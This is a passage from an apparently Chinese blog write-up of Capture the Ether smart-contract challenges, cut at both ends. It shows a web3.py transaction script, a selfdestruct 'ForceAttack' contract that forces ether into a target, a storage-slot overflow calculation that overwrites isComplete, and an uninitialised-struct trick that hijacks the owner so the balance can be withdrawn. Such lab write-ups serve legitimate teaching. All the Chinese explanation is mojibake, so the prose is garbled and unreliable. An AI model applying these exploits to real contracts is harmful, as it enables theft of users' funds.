class="line"><span class="string">&quot;name&quot;: &quot;transfer&quot;,</span></span><br><span class="line"><span class="string">&quot;outputs&quot;: [],</span></span><br><span class="line"><span class="string">&quot;payable&quot;: false,</span></span><br><span class="line"><span class="string">&quot;stateMutability&quot;: &quot;nonpayable&quot;,</span></span><br><span class="line"><span class="string">&quot;type&quot;: &quot;function&quot;</span></span><br><span class="line"><span class="string">&#125;,</span></span><br><span class="line"><span class="string">&#123;</span></span><br><span class="line"><span class="string">&quot;constant&quot;: true,</span></span><br><span class="line"><span class="string">&quot;inputs&quot;: [],</span></span><br><span class="line"><span class="string">&quot;name&quot;: &quot;isComplete&quot;,</span></span><br><span class="line"><span class="string">&quot;outputs&quot;: [</span></span><br><span class="line"><span class="string">&#123;</span></span><br><span class="line"><span class="string">&quot;name&quot;: &quot;&quot;,</span></span><br><span class="line"><span class="string">&quot;type&quot;: &quot;bool&quot;</span></span><br><span class="line"><span class="string">&#125;</span></span><br><span class="line"><span class="string">],</span></span><br><span class="line"><span class="string">&quot;payable&quot;: false,</span></span><br><span class="line"><span class="string">&quot;stateMutability&quot;: &quot;view&quot;,</span></span><br><span class="line"><span class="string">&quot;type&quot;: &quot;function&quot;</span></span><br><span class="line"><span class="string">&#125;,</span></span><br><span class="line"><span class="string">&#123;</span></span><br><span class="line"><span class="string">&quot;constant&quot;: true,</span></span><br><span class="line"><span class="string">&quot;inputs&quot;: [</span></span><br><span class="line"><span class="string">&#123;</span></span><br><span class="line"><span class="string">&quot;name&quot;: &quot;&quot;,</span></span><br><span class="line"><span class="string">&quot;type&quot;: &quot;address&quot;</span></span><br><span class="line"><span class="string">&#125;,</span></span><br><span class="line"><span class="string">&#123;</span></span><br><span class="line"><span class="string">&quot;name&quot;: &quot;&quot;,</span></span><br><span class="line"><span class="string">&quot;type&quot;: &quot;address&quot;</span></span><br><span class="line"><span class="string">&#125;</span></span><br><span class="line"><span class="string">],</span></span><br><span class="line"><span class="string">&quot;name&quot;: &quot;allowance&quot;,</span></span><br><span class="line"><span class="string">&quot;outputs&quot;: [</span></span><br><span class="line"><span class="string">&#123;</span></span><br><span class="line"><span class="string">&quot;name&quot;: &quot;&quot;,</span></span><br><span class="line"><span class="string">&quot;type&quot;: &quot;uint256&quot;</span></span><br><span class="line"><span class="string">&#125;</span></span><br><span class="line"><span class="string">],</span></span><br><span class="line"><span class="string">&quot;payable&quot;: false,</span></span><br><span class="line"><span class="string">&quot;stateMutability&quot;: &quot;view&quot;,</span></span><br><span class="line"><span class="string">&quot;type&quot;: &quot;function&quot;</span></span><br><span class="line"><span class="string">&#125;,</span></span><br><span class="line"><span class="string">&#123;</span></span><br><span class="line"><span class="string">&quot;inputs&quot;: [</span></span><br><span class="line"><span class="string">&#123;</span></span><br><span class="line"><span class="string">&quot;name&quot;: &quot;_player&quot;,</span></span><br><span class="line"><span class="string">&quot;type&quot;: &quot;address&quot;</span></span><br><span class="line"><span class="string">&#125;</span></span><br><span class="line"><span class="string">],</span></span><br><span class="line"><span class="string">&quot;payable&quot;: false,</span></span><br><span class="line"><span class="string">&quot;stateMutability&quot;: &quot;nonpayable&quot;,</span></span><br><span class="line"><span class="string">&quot;type&quot;: &quot;constructor&quot;</span></span><br><span class="line"><span class="string">&#125;,</span></span><br><span class="line"><span class="string">&#123;</span></span><br><span class="line"><span class="string">&quot;anonymous&quot;: false,</span></span><br><span class="line"><span class="string">&quot;inputs&quot;: [</span></span><br><span class="line"><span class="string">&#123;</span></span><br><span class="line"><span class="string">&quot;indexed&quot;: true,</span></span><br><span class="line"><span class="string">&quot;name&quot;: &quot;from&quot;,</span></span><br><span class="line"><span class="string">&quot;type&quot;: &quot;address&quot;</span></span><br><span class="line"><span class="string">&#125;,</span></span><br><span class="line"><span class="string">&#123;</span></span><br><span class="line"><span class="string">&quot;indexed&quot;: true,</span></span><br><span class="line"><span class="string">&quot;name&quot;: &quot;to&quot;,</span></span><br><span class="line"><span class="string">&quot;type&quot;: &quot;address&quot;</span></span><br><span class="line"><span class="string">&#125;,</span></span><br><span class="line"><span class="string">&#123;</span></span><br><span class="line"><span class="string">&quot;indexed&quot;: false,</span></span><br><span class="line"><span class="string">&quot;name&quot;: &quot;value&quot;,</span></span><br><span class="line"><span class="string">&quot;type&quot;: &quot;uint256&quot;</span></span><br><span class="line"><span class="string">&#125;</span></span><br><span class="line"><span class="string">],</span></span><br><span class="line"><span class="string">&quot;name&quot;: &quot;Transfer&quot;,</span></span><br><span class="line"><span class="string">&quot;type&quot;: &quot;event&quot;</span></span><br><span class="line"><span class="string">&#125;,</span></span><br><span class="line"><span class="string">&#123;</span></span><br><span class="line"><span class="string">&quot;anonymous&quot;: false,</span></span><br><span class="line"><span class="string">&quot;inputs&quot;: [</span></span><br><span class="line"><span class="string">&#123;</span></span><br><span class="line"><span class="string">&quot;indexed&quot;: true,</span></span><br><span class="line"><span class="string">&quot;name&quot;: &quot;owner&quot;,</span></span><br><span class="line"><span class="string">&quot;type&quot;: &quot;address&quot;</span></span><br><span class="line"><span class="string">&#125;,</span></span><br><span class="line"><span class="string">&#123;</span></span><br><span class="line"><span class="string">&quot;indexed&quot;: true,</span></span><br><span class="line"><span class="string">&quot;name&quot;: &quot;spender&quot;,</span></span><br><span class="line"><span class="string">&quot;type&quot;: &quot;address&quot;</span></span><br><span class="line"><span class="string">&#125;,</span></span><br><span class="line"><span class="string">&#123;</span></span><br><span class="line"><span class="string">&quot;indexed&quot;: false,</span></span><br><span class="line"><span class="string">&quot;name&quot;: &quot;value&quot;,</span></span><br><span class="line"><span class="string">&quot;type&quot;: &quot;uint256&quot;</span></span><br><span class="line"><span class="string">&#125;</span></span><br><span class="line"><span class="string">],</span></span><br><span class="line"><span class="string">&quot;name&quot;: &quot;Approval&quot;,</span></span><br><span class="line"><span class="string">&quot;type&quot;: &quot;event&quot;</span></span><br><span class="line"><span class="string">&#125;</span></span><br><span class="line"><span class="string">]</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#    function transferFrom(address from, address to, uint256 value) public &#123;</span></span><br><span class="line">w3 = Web3(HTTPProvider(<span class="string">&quot;https://ropsten.infura.io/v3/[api_key]&quot;</span>))</span><br><span class="line"></span><br><span class="line">contract = w3.eth.contract(address = challenge_addr, abi = json.loads(challenge_api))</span><br><span class="line"></span><br><span class="line">MasterAccount = w3.eth.account.from_key(MasterPrivKey)</span><br><span class="line">HelpAccount   = w3.eth.account.from_key(HelpPrivKey)</span><br><span class="line"><span class="comment"># setp1</span></span><br><span class="line">log.info(<span class="string">&quot;Step1 , Transfer to HELP Account: 800 value &quot;</span>)</span><br><span class="line"><span class="comment">#    function transfer(address to, uint256 value) public &#123;</span></span><br><span class="line">tx = contract.functions.transfer(HelpAccount.address, <span class="number">800</span>).buildTransaction(</span><br><span class="line">    &#123;</span><br><span class="line">       <span class="string">&#x27;nonce&#x27;</span> : w3.eth.getTransactionCount(MasterAccount.address),</span><br><span class="line">       <span class="string">&#x27;gas&#x27;</span> : <span class="number">3000000</span></span><br><span class="line">    &#125;</span><br><span class="line">)</span><br><span class="line">signed =  MasterAccount.signTransaction(tx)</span><br><span class="line">tx_id  =  w3.eth.sendRawTransaction(signed.rawTransaction)</span><br><span class="line">receipt = w3.eth.wait_for_transaction_receipt(tx_id, timeout = <span class="number">300</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> receipt[<span class="string">&#x27;status&#x27;</span>] != <span class="number">1</span>:</span><br><span class="line">    log.failure(<span class="string">&quot;Step1 Failed !&quot;</span>)</span><br><span class="line">    exit(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># step2 </span></span><br><span class="line">log.info(<span class="string">&quot;Step2 , Call approve&quot;</span>)</span><br><span class="line"><span class="comment">#    unction approve(address spender, uint256 value) public &#123;</span></span><br><span class="line">tx = contract.functions.approve(MasterAccount.address, <span class="number">1000</span>).buildTransaction(</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="string">&#x27;nonce&#x27;</span> : w3.eth.getTransactionCount(HelpAccount.address),</span><br><span class="line">        <span class="string">&#x27;gas&#x27;</span> : <span class="number">3000000</span></span><br><span class="line">    &#125;</span><br><span class="line">)</span><br><span class="line">signed = HelpAccount.signTransaction(tx)</span><br><span class="line">tx_id = w3.eth.sendRawTransaction(signed.rawTransaction)</span><br><span class="line">receipt = w3.eth.wait_for_transaction_receipt(tx_id, timeout = <span class="number">300</span>)</span><br><span class="line"><span class="keyword">if</span> receipt[<span class="string">&#x27;status&#x27;</span>] != <span class="number">1</span>:</span><br><span class="line">    log.failure(<span class="string">&quot;Step2 Failed !&quot;</span>)</span><br><span class="line">    exit(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># step3 transferFrom(address)</span></span><br><span class="line">log.info(<span class="string">&quot;Step3 , call transferFrom to solve challenge&quot;</span>)</span><br><span class="line"><span class="comment">#    function transferFrom(address from, address to, uint256 value) public &#123;</span></span><br><span class="line">tx = contract.functions.transferFrom(HelpAccount.address,HelpAccount.address, <span class="number">500</span>).buildTransaction(</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="string">&#x27;nonce&#x27;</span> : w3.eth.getTransactionCount(MasterAccount.address),</span><br><span class="line">        <span class="string">&#x27;gas&#x27;</span> : <span class="number">3000000</span></span><br><span class="line">    &#125;</span><br><span class="line">)</span><br><span class="line">signed =  MasterAccount.signTransaction(tx)</span><br><span class="line">tx_id  =  w3.eth.sendRawTransaction(signed.rawTransaction)</span><br><span class="line">receipt = w3.eth.wait_for_transaction_receipt(tx_id, timeout = <span class="number">300</span>)</span><br><span class="line"><span class="keyword">if</span> receipt[<span class="string">&#x27;status&#x27;</span>] != <span class="number">1</span>:</span><br><span class="line">    log.failure(<span class="string">&quot;Step3 Failed !&quot;</span>)</span><br><span class="line">    exit(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">print(contract.functions.isComplete().call())</span><br><span class="line">log.success(<span class="string">&quot;Solved !&quot;</span>)</span><br><span class="line"></span><br></pre></td></tr></table></figure><h3 id="3-Retirement-fund"><a href="#3-Retirement-fund" class="headerlink" title="3. Retirement fund"></a>3. Retirement fund</h3><p><strong>é¢˜ç›®æè¿°ï¼š</strong></p><p>This retirement fund is what economists call aÂ <a href="https://en.wikipedia.org/wiki/Commitment_device">commitment device</a>. Iâ€™m trying to make sure I hold on to 1 ether for retirement.</p><p>Iâ€™ve committed 1 ether to the contract below, and I wonâ€™t withdraw it until 10 years have passed. If IÂ <em>do</em>Â withdraw early, 10% of my ether goes to theÂ <code>beneficiary</code>Â (you!).</p><p>I really donâ€™t want you to have 0.1 of my ether, so Iâ€™m resolved to leave those funds alone until 10 years from now. Good luck!</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line">pragma solidity ^0.4.21;</span><br><span class="line"></span><br><span class="line">contract RetirementFundChallenge &#123;</span><br><span class="line">    uint256 startBalance;</span><br><span class="line">    address owner &#x3D; msg.sender;</span><br><span class="line">    address beneficiary;</span><br><span class="line">    uint256 expiration &#x3D; now + 10 years;</span><br><span class="line"></span><br><span class="line">    function RetirementFundChallenge(address player) public payable &#123;</span><br><span class="line">        require(msg.value &#x3D;&#x3D; 1 ether);</span><br><span class="line"></span><br><span class="line">        beneficiary &#x3D; player;</span><br><span class="line">        startBalance &#x3D; msg.value;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function isComplete() public view returns (bool) &#123;</span><br><span class="line">        return address(this).balance &#x3D;&#x3D; 0;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function withdraw() public &#123;</span><br><span class="line">        require(msg.sender &#x3D;&#x3D; owner);</span><br><span class="line"></span><br><span class="line">        if (now &lt; expiration) &#123;</span><br><span class="line">            &#x2F;&#x2F; early withdrawal incurs a 10% penalty</span><br><span class="line">            msg.sender.transfer(address(this).balance * 9 &#x2F; 10);</span><br><span class="line">        &#125; else &#123;</span><br><span class="line">            msg.sender.transfer(address(this).balance);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function collectPenalty() public &#123;</span><br><span class="line">        require(msg.sender &#x3D;&#x3D; beneficiary);</span><br><span class="line"></span><br><span class="line">        uint256 withdrawn &#x3D; startBalance - address(this).balance;</span><br><span class="line"></span><br><span class="line">        &#x2F;&#x2F; an early withdrawal occurred</span><br><span class="line">        require(withdrawn &gt; 0);</span><br><span class="line"></span><br><span class="line">        &#x2F;&#x2F; penalty is what&#39;s left</span><br><span class="line">        msg.sender.transfer(address(this).balance);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>Enjoy this inspirational music while you work:Â <a href="https://www.youtube.com/watch?v=Mx0xCI1jaUM">Smooth Criminal</a>.</p><p><strong>è§£é¢˜ï¼š</strong></p><p>é¢˜ç›®è®¾ç½®äº†ä¸€ä¸ªåå¹´åæ‰èƒ½å–å‡º eth çš„åˆçº¦ï¼Œ è¦æ±‚æˆ‘ä»¬æå‰å–å‡ºæ‰€æœ‰çš„ Balance ã€‚é‡ç‚¹åœ¨  <code>collectPenalty</code> å‡½æ•°ä¸Šã€‚</p><p>å¦‚æœæˆ‘ä»¬èƒ½ä½¿å¾— <code>withdrawn &gt; 0</code>  æˆç«‹ï¼Œ åˆ™å¯ä»¥å–å‡ºæ‰€æœ‰çš„æ¶ balance , æˆ‘ä»¬ä¼šæ³¨æ„åˆ°   <code>startBalance - address(this).balance</code>  å­˜åœ¨æº¢å‡ºï¼Œ ä½†æ˜¯æ¡ä»¶å¾—æ˜¯ <code>startBalance</code>  å°äº <code>address(this).balance</code> ã€‚ </p><p>è¿™é‡Œæ¶‰åŠåˆ°ä¸€ä¸ªçŸ¥è¯†ç‚¹ï¼š</p><p>Â <code>SELFDESTRUCT</code>Â å‡½æ•°å¯ä»¥å¼ºåˆ¶å‘é€ ETHï¼š</p><p><code>SELFDESTRUCT</code>  æ˜¯ä¸€ä¸ªè‡ªæ¯å‡½æ•°ï¼Œå½“ä½ è°ƒç”¨å®ƒçš„æ—¶å€™ï¼Œå®ƒä¼šä½¿è¯¥åˆçº¦æ— æ•ˆåŒ–å¹¶åˆ é™¤è¯¥åœ°å€çš„å­—èŠ‚ç ï¼Œç„¶åå®ƒä¼šæŠŠåˆçº¦é‡Œå‰©ä½™çš„balanceå‘é€ç»™å‚æ•°æ‰€æŒ‡å®šçš„åœ°å€ï¼Œæ¯”è¾ƒç‰¹æ®Šçš„æ˜¯è¿™ç¬”etherçš„å‘é€å°†æ— è§†åˆçº¦çš„fallbackå‡½æ•°ï¼Œæ‰€ä»¥å®ƒæ˜¯å¼ºåˆ¶æ€§çš„ ã€‚</p><p>æ”»å‡»åˆçº¦ä»£ç ï¼š</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">pragma solidity ^0.4.21;</span><br><span class="line"></span><br><span class="line">contract ForceAttack &#123;</span><br><span class="line"></span><br><span class="line">function ForceAttack(address target) public payable &#123;</span><br><span class="line">        require(msg.value &gt; 0);</span><br><span class="line">        selfdestruct(target);</span><br><span class="line">    &#125; </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><a href="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/2022-05-03-56e0b6532a1b9189dca92827361b4251-6a4de7.png" class="gallery-item"><img src="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/2022-05-03-56e0b6532a1b9189dca92827361b4251-6a4de7.png"></a></p><p>æœ€åè°ƒç”¨ <code>collectPenalty</code>  å‡½æ•°å³å¯ã€‚</p><h3 id="4-Mapping"><a href="#4-Mapping" class="headerlink" title="4. Mapping"></a>4. Mapping</h3><p><strong>é¢˜ç›®æè¿°:</strong></p><p>MATH: 750 POINTS</p><p><a href="https://capturetheether.com/challenges/math/mapping/#">Begin Challenge</a></p><p>Who needsÂ <code>mapping</code>s? Iâ€™ve created a contract that can store key/value pairs using just an array.</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">pragma solidity ^0.4.21;</span><br><span class="line"></span><br><span class="line">contract MappingChallenge &#123;</span><br><span class="line">    bool public isComplete;</span><br><span class="line">    uint256[] map;</span><br><span class="line"></span><br><span class="line">    function set(uint256 key, uint256 value) public &#123;</span><br><span class="line">        &#x2F;&#x2F; Expand dynamic array as needed</span><br><span class="line">        if (map.length &lt;&#x3D; key) &#123;</span><br><span class="line">            map.length &#x3D; key + 1;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        map[key] &#x3D; value;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function get(uint256 key) public view returns (uint256) &#123;</span><br><span class="line">        return map[key];</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>Enjoy this inspirational music while you work:Â <a href="https://www.youtube.com/watch?v=A259WnFMRXI">Map To My Heart</a>.</p><p><strong>è§£é¢˜ï¼š</strong></p><p>é¢˜ç›®è®¾ç½®äº† ä¸€ä¸ª map ï¼Œ æˆ‘ä»¬å¯ä»¥å¯¹ map è¿›è¡Œæ“ä½œï¼Œ è¦æ±‚å°† <code>isComplete</code> è®¾ç½®ä¸º True å³å¯ã€‚ æ„Ÿè§‰å°±æ˜¯æº¢å‡º map çš„ç©ºé—´ï¼Œè¦†ç›–åˆ° <code>isComplete</code>  çš„ä½ç½®å³å¯ã€‚</p><p>é€šè¿‡äº†è§£ï¼Œæˆ‘ä»¬å¯ä»¥çŸ¥é“åŠ¨æ€æ•°ç»„ï¼Œå…¶åœ¨å£°æ˜ä¸­æ‰€åœ¨ä½ç½®å†³å®šçš„å­˜å‚¨ä½é‡Œå­˜æ”¾çš„æ˜¯å…¶é•¿åº¦ï¼Œè€Œå…¶ä¸­çš„å˜é‡çš„å­˜å‚¨ä½åˆ™æ˜¯åŸºäºå…¶é•¿åº¦æ‰€åœ¨çš„å­˜å‚¨è¿›è¡Œï¼Œè¿™éƒ¨åˆ†çš„è¯¦ç»†å†…å®¹å¯ä»¥å‚è§æ­¤å¤„ä¸€ç¯‡ç¿»è¯‘æ–‡ç« <a href="https://segmentfault.com/a/1190000013791133">äº†è§£ä»¥å¤ªåŠæ™ºèƒ½åˆçº¦å­˜å‚¨</a></p><p>solidityçš„storage slotå­˜å‚¨</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"></span><br><span class="line">slot 0: isComplete</span><br><span class="line">slot 1: map.length</span><br><span class="line">&#x2F;&#x2F; ...</span><br><span class="line">slot keccak(1): map[0]</span><br><span class="line">slot keccak(1) + 1: map[1]</span><br><span class="line">slot keccak(1) + 2: map[2]</span><br><span class="line">slot keccak(1) + 3: map[3]</span><br><span class="line">slot keccak(1) + 4: map[4]</span><br><span class="line">&#x2F;&#x2F; ...</span><br></pre></td></tr></table></figure><p>åŠ¨æ€æ•°ç»„å†…å˜é‡æ‰€åœ¨çš„å­˜å‚¨ä½çš„è®¡ç®—å…¬å¼å³ä¸º</p><blockquote><p>keccak256(slot) + index</p></blockquote><p>map.length = key + 1;<br>å½“map.lengthæº¢å‡ºä¼šå›ç»•åˆ°slot 0 å³å¯å®ŒæˆisCompleteçš„è¦†ç›–</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; a &#x3D; binascii.unhexlify(&#39;%064x&#39; % 1)</span><br><span class="line">&gt;&gt;&gt; Web3.keccak(a)</span><br><span class="line">HexBytes(&#39;0xb10e2d527612073b26eecdfd717e6a320cf44b4afac2b0732d9fcbe2b7fa0cf6&#39;)</span><br><span class="line"></span><br><span class="line">&gt;&gt;&gt; 2**256 - int(0xb10e2d527612073b26eecdfd717e6a320cf44b4afac2b0732d9fcbe2b7fa0cf6)</span><br><span class="line">35707666377435648211887908874984608119992236509074197713628505308453184860938</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>åˆ™åœ¨ <code>35707666377435648211887908874984608119992236509074197713628505308453184860938</code>  ä½ç½®è®¾ç½®ä¸º 1 å³å¯ã€‚</p><p><a href="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/2022-05-03-d1dcf575fc9218b0e5e3c8830d9072f1-2cf778.png" class="gallery-item"><img src="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/2022-05-03-d1dcf575fc9218b0e5e3c8830d9072f1-2cf778.png"></a></p><h3 id="5-Donation"><a href="#5-Donation" class="headerlink" title="5. Donation"></a>5. Donation</h3><p><strong>é¢˜ç›®æè¿°ï¼š</strong></p><p>A candidate you donâ€™t like is accepting campaign contributions via the smart contract below.</p><p>To complete this challenge, steal the candidateâ€™s ether.</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line">pragma solidity ^0.4.21;</span><br><span class="line"></span><br><span class="line">contract DonationChallenge &#123;</span><br><span class="line">    struct Donation &#123;</span><br><span class="line">        uint256 timestamp;</span><br><span class="line">        uint256 etherAmount;</span><br><span class="line">    &#125;</span><br><span class="line">    Donation[] public donations;</span><br><span class="line"></span><br><span class="line">    address public owner;</span><br><span class="line"></span><br><span class="line">    function DonationChallenge() public payable &#123;</span><br><span class="line">        require(msg.value &#x3D;&#x3D; 1 ether);</span><br><span class="line">        </span><br><span class="line">        owner &#x3D; msg.sender;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    function isComplete() public view returns (bool) &#123;</span><br><span class="line">        return address(this).balance &#x3D;&#x3D; 0;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function donate(uint256 etherAmount) public payable &#123;</span><br><span class="line">        &#x2F;&#x2F; amount is in ether, but msg.value is in wei</span><br><span class="line">        uint256 scale &#x3D; 10**18 * 1 ether;</span><br><span class="line">        require(msg.value &#x3D;&#x3D; etherAmount &#x2F; scale);</span><br><span class="line"></span><br><span class="line">        Donation donation;</span><br><span class="line">        donation.timestamp &#x3D; now;</span><br><span class="line">        donation.etherAmount &#x3D; etherAmount;</span><br><span class="line"></span><br><span class="line">        donations.push(donation);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function withdraw() public &#123;</span><br><span class="line">        require(msg.sender &#x3D;&#x3D; owner);</span><br><span class="line">        </span><br><span class="line">        msg.sender.transfer(address(this).balance);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>Enjoy this inspirational music while you work:Â <a href="https://www.youtube.com/watch?v=_AUXpnB065o">Space Force</a>.</p><p><strong>è§£é¢˜ï¼š</strong></p><p>è¿™ä¹Ÿæ˜¯ä¸€ä¸ªå˜é‡è¦†ç›–é¢˜ç›®ã€‚  Structåœ¨å‡½æ•°å†…éæ˜¾å¼åœ°åˆå§‹åŒ–çš„æ—¶å€™ä¼šä½¿ç”¨storageå­˜å‚¨è€Œä¸æ˜¯memoryã€‚å…·ä½“è®²å°±æ˜¯ <code>donate()</code>Â ä¸­Â <code>donation</code>Â å®šä¹‰æ—¶æœªæŒ‡å®šå¼•ç”¨ï¼Œé»˜è®¤æŒ‡å‘ slot0 ã€‚ å› æ­¤æˆ‘ä»¬å¯è¦†ç›–solt 0å’Œslot 1å¤„1å­˜å‚¨çš„çŠ¶æ€å˜é‡ï¼Œæ°å¥½solt 1å­˜å‚¨çš„å³ä¸ºowner</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Donation donation;</span><br><span class="line">donation.timestamp &#x3D; now;</span><br><span class="line">donation.etherAmount &#x3D; etherAmount;</span><br><span class="line"></span><br><span class="line">nowè¦†ç›–slot(0) etherAmountè¦†ç›–slot(1) åˆ©ç”¨etherAmountè¦†ç›–owner</span><br></pre></td></tr></table></figure><p>æˆ‘ä»¬éœ€è¦å°† owner è¦†ç›–ä¸ºæˆ‘ä»¬çš„è´¦æˆ·ï¼Œ ç„¶åå°† balance å–å‡ºã€‚</p><p>æ”»å‡»ï¼š è®¾ç½® value æ»¡è¶³è¦æ±‚ï¼Œå³  <code>address // 10**36</code> , è®¾ç½® etherAmount çš„å€¼ä¸ºæˆ‘çš„åœ°å€</p><p><a href="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/2022-05-04-6f26b26a462d04d333633fe40ca5cc26-aaa1a0.png" class="gallery-item"><img src="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/2022-05-04-6f26b26a462d04d333633fe40ca5cc26-aaa1a0.png"></a></p><p>æ”»å‡»åï¼š</p><p><a href="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/2022-05-04-4b66ff4cca9faf1eecd042aeeb118525-f7a3f0.png" class="gallery-item"><img src="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/2022-05-04-4b66ff4cca9faf1eecd042aeeb118525-f7a3f0.png"></a></p><p>è¿™æ ·æˆ‘å°±å¯ä»¥å°† balance å…¨éƒ¨å–å‡ºäº†ã€‚</p><h3 id="6-Fifty-years"><a href="#6-Fifty-years" class="headerlink" title="6. Fifty years"></a>6. Fifty years</h3><p><strong>é¢˜ç›®æè¿°ï¼š</strong></p><p>This contract locks away ether. The initial ether is locked away until 50 years has passed, and subsequent contributions are locked until even later.</p><p>All you have to do to complete this challenge is wait 50 years and withdraw the ether. If youâ€™re not that patient, youâ€™ll need to combine several techniques to hack this contract.</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span 